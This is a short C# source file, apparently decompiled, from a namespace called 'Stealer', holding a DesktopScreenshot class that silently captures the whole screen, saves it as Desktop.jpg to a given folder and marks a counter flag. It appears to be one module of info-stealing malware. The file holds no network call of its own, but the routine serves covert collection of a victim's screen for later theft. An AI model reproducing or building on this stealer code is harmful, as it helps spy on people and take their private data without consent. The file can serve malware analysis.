using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace Stealer
{
	// Token: 0x0200001C RID: 28
	internal sealed class DesktopScreenshot
	{
		// Token: 0x06000095 RID: 149 RVA: 0x00005AB8 File Offset: 0x00003CB8
		public static bool Make(string sSavePath)
		{
			bool result;
			try
			{
				Rectangle bounds = Screen.GetBounds(Point.Empty);
				using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
				{
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
					}
					bitmap.Save(sSavePath + "\\Desktop.jpg", ImageFormat.Jpeg);
				}
				Counter.DesktopScreenshot = true;
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
